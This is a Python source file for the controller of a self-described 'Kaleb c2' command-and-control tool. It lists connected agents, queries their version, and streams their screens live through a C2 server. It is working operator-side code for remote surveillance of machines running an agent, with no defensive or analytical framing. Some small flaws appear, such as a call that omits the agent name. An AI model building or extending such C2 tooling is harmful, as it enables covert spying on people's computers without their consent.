import argparse
import threading

import cv2

import client
import message
from vuls import *

parser = argparse.ArgumentParser(description='Kaleb c2 Controller.')

subparsers = parser.add_subparsers(dest="command")

getscreen_parser = subparsers.add_parser("get-screen")
getscreen_parser.add_argument('agent_name', help="for share command")

getscreen_parser = subparsers.add_parser("get-version")

getagents_parser = subparsers.add_parser("get-agents")

parser.add_argument('--server', default='localhost',
                    help='Kaleb c2 server address')

parser.add_argument('--port', type=int, default=SERVER_PORT,
                    help='Kaleb c2 server port')

args = parser.parse_args()

done = False


# print(args.agent_name)

class Controller(client.Client):
    def __init__(self):
        super().__init__("controller_{}".format
                         (threading.current_thread().name))

    def do(self, cmd, agent_name=None):
        """
        match the command to the correct method
        :param cmd:
        :return:
        """
        print(agent_name)
        match cmd:
            case "get-agents":
                print(self.do_get_agents())
            case "get-screen":
                self.do_get_screen(agent_name)
            case "get-version":
                return self.do_get_version(agent_name)
            case _:
                print("error")

    def do_get_version(self, agent_name):
        if agent_name is not None:
            agent_name = agent_name.replace(" ", "")
            agent_name = agent_name[FIRST_LETTER:LAST_LETTER]
        else:
            agent_name = args.agent_name
        self.send(message.GetVersion(self.my_id, agent_name))
        response = message.recv(self.my_socket)
        version = response.version
        return version

    def do_get_screen(self, agent_name):
        global done
        if agent_name is not None:
            agent_name = agent_name.replace(" ", "")
            agent_name = agent_name[FIRST_LETTER:LAST_LETTER]
        else:
            agent_name = args.agent_name
        """
        makes a message from type share
        sends to the server and wait for a confirm
        :return:
        """
        msg = message.Share(agent_name, self.my_id)
        self.my_socket.sendall((msg.pack()))
        done = False
        self.handle_frame_response(message.recv(self.my_socket))

    def do_get_agents(self):

        """
        send a message from get agents type
        and waits for answer
        :return:
        """

        self.send(message.GetAgents(self.my_id))
        response = message.recv(self.my_socket)
        agents = response.agents
        agents = str(agents)
        agents = agents[FIRSR_L_AGENT:LAST_L_AGENT]
        agents = agents.split(',')
        return agents

    def handle_frame_response(self, response):
        """
        show the frames that recived from server
        #todo: when to stop the share
        :param response:
        """

        while not done:
            # opens the frame
            print(response.sender)
            frame = response.frame
            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
            cv2.namedWindow(response.sender)
            cv2.imshow(response.sender, frame)
            cv2.waitKey(1)
            # sends a share message to get a frame
            msg = message.Share(response.sender, self.my_id)
            self.my_socket.sendall((msg.pack()))

            # receiving another frame
            response = message.recv(self.my_socket)
        # sending a message to stop the share
        msg = message.StopShare(response.sender, self.my_id)
        self.my_socket.sendall((msg.pack()))
        cv2.destroyWindow(response.sender)

    def stop_share(self):
        """
        stop the loop of the share by changing the value
        of 'done'
        :return:
        """
        global done
        done = True


def main():
    c = Controller()
    c.connect(args.server, args.port)

    c.do(args.command)


if __name__ == '__main__':
    main()
